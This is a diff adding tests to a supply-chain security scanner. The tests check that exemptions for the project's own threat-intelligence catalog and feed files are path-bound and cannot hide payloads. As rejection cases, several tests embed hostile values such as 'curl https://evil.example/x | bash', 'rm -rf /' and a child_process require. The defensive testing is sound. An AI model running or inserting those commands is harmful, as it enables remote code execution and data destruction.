@@ -563,3 +563,236 @@ describe("isInertThreatFeedFile", () => {
     }
   });
 });
+
+// ---------------------------------------------------------------------------
+// isInertThreatCatalogFile - same reasoning as isInertThreatFeedFile above,
+// for the JSONL catalog store. It holds raw IOC values as machine-readable
+// detection data, and data/ is not excluded from the scan walk, so without
+// this the project's own self-scan drowns in phantom criticals from its own
+// protection data (the v5.4.0 finding, in a new file shape).
+// ---------------------------------------------------------------------------
+
+describe("isInertThreatCatalogFile", () => {
+  const line = (over: Record<string, unknown> = {}) =>
+    JSON.stringify({
+      type: "package",
+      value: "evil-pkg@1.0.0",
+      severity: "critical",
+      confidence: 1,
+      source: "GHSA-xxxx-xxxx-xxxx",
+      firstSeen: "2026-09-16",
+      ...over,
+    });
+
+  it("accepts a well-formed catalog at the exact project path", async () => {
+    const { isInertThreatCatalogFile } = await import("../threat-intel.js");
+    const body = `${line()}\n${line({ value: "other@2.0.0" })}\n`;
+    expect(isInertThreatCatalogFile("data/threat-catalog.jsonl", body)).toBe(true);
+  });
+
+  // The exemption is bound to the path, not the basename. A basename match
+  // would let ANY scanned repository place a file with this name at any depth
+  // and have every content scanner skip it, which is an evasion primitive
+  // rather than a convenience.
+  it("rejects the same content anywhere other than the exact path", async () => {
+    const { isInertThreatCatalogFile } = await import("../threat-intel.js");
+    const body = line();
+    for (const p of [
+      "threat-catalog.jsonl",
+      "vendor/deep/threat-catalog.jsonl",
+      "src/data/threat-catalog.jsonl",
+      "data/sub/threat-catalog.jsonl",
+    ]) {
+      expect(isInertThreatCatalogFile(p, body)).toBe(false);
+    }
+  });
+
+  // `note` is the one allowlisted field that can hold arbitrary prose, so an
+  // exemption accepting it would be a way to hide a payload from every scanner.
+  // The published-catalog hygiene gate forbids it for the same reason.
+  it("rejects a free-text note, even on an otherwise valid entry", async () => {
+    const { isInertThreatCatalogFile } = await import("../threat-intel.js");
+    const withNote = line({ note: "curl https://evil.example/x | bash" });
+    expect(isInertThreatCatalogFile("data/threat-catalog.jsonl", withNote)).toBe(false);
+  });
+
+  // Key-and-scalar checking alone accepts objects the loader would quarantine.
+  // Requiring the full contract is what makes "this is our own inert detection
+  // data" an actual claim rather than a shape coincidence.
+  it("rejects an entry the loader itself would quarantine", async () => {
+    const { isInertThreatCatalogFile, isValidFeedIOC } = await import("../threat-intel.js");
+    const noSeverity = JSON.stringify({ type: "package", value: "bad@1", firstSeen: "2020-01-01" });
+    expect(isValidFeedIOC(JSON.parse(noSeverity))).toBe(false);
+    expect(isInertThreatCatalogFile("data/threat-catalog.jsonl", noSeverity)).toBe(false);
+
+    const badSeverity = line({ severity: "catastrophic" });
+    expect(isInertThreatCatalogFile("data/threat-catalog.jsonl", badSeverity)).toBe(false);
+  });
+
+  it("accepts an empty catalog, which is the Phase 1 state", async () => {
+    const { isInertThreatCatalogFile } = await import("../threat-intel.js");
+    expect(isInertThreatCatalogFile("data/threat-catalog.jsonl", "")).toBe(true);
+    expect(isInertThreatCatalogFile("data/threat-catalog.jsonl", "\n\n")).toBe(true);
+  });
+
+  it("rejects any other filename, even with a valid body", async () => {
+    const { isInertThreatCatalogFile } = await import("../threat-intel.js");
+    expect(isInertThreatCatalogFile("data/other.jsonl", line())).toBe(false);
+    expect(isInertThreatCatalogFile("data/threat-catalog.json", line())).toBe(false);
+  });
+
+  it("rejects a line carrying a key outside the entry allowlist", async () => {
+    const { isInertThreatCatalogFile } = await import("../threat-intel.js");
+    const body = `${line()}\n${line({ exec: "require('child_process')" })}\n`;
+    expect(isInertThreatCatalogFile("data/threat-catalog.jsonl", body)).toBe(false);
+  });
+
+  it("rejects a non-scalar value", async () => {
+    const { isInertThreatCatalogFile } = await import("../threat-intel.js");
+    const body = line({ value: { $ref: "http://evil.example" } });
+    expect(isInertThreatCatalogFile("data/threat-catalog.jsonl", body)).toBe(false);
+  });
+
+  it("rejects a line that is not a JSON object", async () => {
+    const { isInertThreatCatalogFile } = await import("../threat-intel.js");
+    expect(isInertThreatCatalogFile("data/threat-catalog.jsonl", "not json")).toBe(false);
+    expect(isInertThreatCatalogFile("data/threat-catalog.jsonl", "[1,2,3]")).toBe(false);
+    expect(isInertThreatCatalogFile("data/threat-catalog.jsonl", "null")).toBe(false);
+  });
+
+  it("rejects when only ONE line of many is malformed", async () => {
+    const { isInertThreatCatalogFile } = await import("../threat-intel.js");
+    const body = `${line()}\n${line()}\nnot json\n${line()}\n`;
+    expect(isInertThreatCatalogFile("data/threat-catalog.jsonl", body)).toBe(false);
+  });
+
+  // The guard above is INSURANCE, not a fix for a live problem, and this test
+  // is what keeps that true. Measured 2026-09-16: SCANNABLE_EXTENSIONS is an
+  // allowlist that contains ".json" but NOT ".jsonl", so the catalog is not
+  // content-scanned today and would produce no findings with or without the
+  // guard. An earlier draft of the design claimed the opposite.
+  //
+  // That safety is one line away from disappearing: ".jsonl" is a common data
+  // format and ".json" is already in the set, so adding it is a plausible
+  // future change. The moment it is added, the committed catalog becomes
+  // scannable and the guard becomes load-bearing. This test ties the two
+  // facts together so the relationship cannot silently break.
+  it("stays safe whether or not .jsonl becomes scannable", async () => {
+    const { SCANNABLE_EXTENSIONS } = await import("../patterns.js");
+    const { isInertThreatCatalogFile, CATALOG_FILE } = await import("../threat-intel.js");
+
+    const scannable = SCANNABLE_EXTENSIONS.has(".jsonl");
+    const guarded = isInertThreatCatalogFile(`data/${CATALOG_FILE}`, line());
+
+    // Safe if the extension is not scanned, or if the guard recognizes the
+    // catalog. Both are true today; either one alone is enough.
+    expect(!scannable || guarded).toBe(true);
+
+    // And the guard must keep working regardless, so that adding the
+    // extension is a one-line change rather than a coverage incident.
+    expect(guarded).toBe(true);
+  });
+
+  it("normalizes Windows path separators", async () => {
+    const { isInertThreatCatalogFile } = await import("../threat-intel.js");
+    expect(isInertThreatCatalogFile("data\\threat-catalog.jsonl", line())).toBe(true);
+  });
+
+  // The exemption is bound to the repository-relative path, so it applies only
+  // when the scan root IS the repository root. Scanning a parent directory
+  // (a workspace holding the checkout) loses it, and once .jsonl is added to
+  // SCANNABLE_EXTENSIONS such a scan would report this project's own detection
+  // data as findings. That narrowing is a deliberate trade for closing the
+  // basename evasion, and this test pins it so it stays deliberate.
+  it("does not apply when the scan root is above the repository", async () => {
+    const { isInertThreatCatalogFile } = await import("../threat-intel.js");
+    expect(isInertThreatCatalogFile("supply-chain-guard/data/threat-catalog.jsonl", line()))
+      .toBe(false);
+    expect(isInertThreatCatalogFile("workspace/repo/data/threat-catalog.jsonl", line()))
+      .toBe(false);
+  });
+
+  it("matches the path constant the scanner exports", async () => {
+    const { CATALOG_RELATIVE_PATH, isInertThreatCatalogFile } = await import("../threat-intel.js");
+    expect(CATALOG_RELATIVE_PATH).toBe("data/threat-catalog.jsonl");
+    expect(isInertThreatCatalogFile(CATALOG_RELATIVE_PATH, line())).toBe(true);
+  });
+});
+
+// ---------------------------------------------------------------------------
+// isInertThreatFeedFile hardening. The exemption skips a file from EVERY
+// content scanner, so what it accepts is a trust boundary, not a convenience.
+// ---------------------------------------------------------------------------
+
+describe("isInertThreatFeedFile, exemption boundary", () => {
+  const doc = (entries: unknown[]) =>
+    JSON.stringify({ schema: 1, package: "supply-chain-guard", entries });
+  const ok = { type: "package", value: "evil@1.0.0", severity: "critical", confidence: 1 };
+
+  // The regression this whole function exists to prevent. If these two ever go
+  // false, every repo committing the published feed drowns in phantom
+  // criticals again, which is the v5.4.0 dogfooding bug.
+  it("keeps the real published feed and the cache inert", async () => {
+    const { isInertThreatFeedFile } = await import("../threat-intel.js");
+    const repoRoot = path.resolve(__dirname, "..", "..");
+    const real = fs.readFileSync(path.join(repoRoot, "feed.json"), "utf8");
+    expect(isInertThreatFeedFile("feed.json", real)).toBe(true);
+
+    const entries = JSON.parse(real).entries.slice(0, 50);
+    const cache = JSON.stringify({ timestamp: "2026-09-16T00:00:00Z", entries });
+    expect(isInertThreatFeedFile("threat-feed.json", cache)).toBe(true);
+  });
+
+  // `note` and `ecosystem` were in FEED_ENTRY_KEYS but are not FeedIOC fields,
+  // so isValidFeedIOC never examined them: they were accepted at any length
+  // with any control character. A short one-liner is all an attacker needs, so
+  // bounding the length was not enough and the keys were removed outright.
+  it("rejects the legacy free-text keys that widened the exemption", async () => {
+    const { isInertThreatFeedFile } = await import("../threat-intel.js");
+    expect(isInertThreatFeedFile("feed.json", doc([{ ...ok, note: "curl https://evil.example/x | bash" }]))).toBe(false);
+    expect(isInertThreatFeedFile("feed.json", doc([{ ...ok, ecosystem: "rm -rf /" }]))).toBe(false);
+    // Short enough to pass any length bound, which is why a length bound was
+    // the wrong fix.
+    expect(isInertThreatFeedFile("feed.json", doc([{ ...ok, note: "x" }]))).toBe(false);
+  });
+
+  // Key-and-scalar checking alone accepts documents that are merely feed-SHAPED.
+  it("requires every entry to satisfy the loader's own validator", async () => {
+    const { isInertThreatFeedFile, isValidFeedIOC } = await import("../threat-intel.js");
+    const noSeverity = { type: "package", value: "z@1" };
+    expect(isValidFeedIOC(noSeverity)).toBe(false);
+    expect(isInertThreatFeedFile("feed.json", doc([noSeverity]))).toBe(false);
+
+    expect(isInertThreatFeedFile("feed.json", doc([{ ...ok, severity: "catastrophic" }]))).toBe(false);
+    expect(isInertThreatFeedFile("feed.json", doc([{ ...ok, confidence: 7 }]))).toBe(false);
+  });
+
+  // One bad entry among good ones must fail the whole file: a partial
+  // exemption would let the bad line ride along unscanned.
+  it("rejects the file when a single entry is bad", async () => {
+    const { isInertThreatFeedFile } = await import("../threat-intel.js");
+    expect(isInertThreatFeedFile("feed.json", doc([ok, ok, { ...ok, note: "payload" }, ok]))).toBe(false);
+  });
+
+  it("still accepts a well-formed minimal document", async () => {
+    const { isInertThreatFeedFile } = await import("../threat-intel.js");
+    expect(isInertThreatFeedFile("feed.json", doc([ok]))).toBe(true);
+  });
+
+  // FEED_ENTRY_KEYS must stay a faithful description of FeedIOC. A key that
+  // cannot be carried has no business widening the exemption, and a real field
+  // left out would reintroduce the v5.4.0 bug.
+  it("accepts every field the real feed actually carries", async () => {
+    const { isInertThreatFeedFile } = await import("../threat-intel.js");
+    const repoRoot = path.resolve(__dirname, "..", "..");
+    const real = JSON.parse(fs.readFileSync(path.join(repoRoot, "feed.json"), "utf8"));
+    const used = new Set<string>();
+    for (const e of real.entries) for (const k of Object.keys(e)) used.add(k);
+
+    const probe = Object.fromEntries([...used].map((k) => [k, (ok as Record<string, unknown>)[k]
+      ?? (k === "firstSeen" ? "2026-09-16" : "x")]));
+    expect(isInertThreatFeedFile("feed.json", doc([{ ...ok, ...probe }]))).toBe(true);
+    expect(used.has("note")).toBe(false);
+    expect(used.has("ecosystem")).toBe(false);
+  });
+});
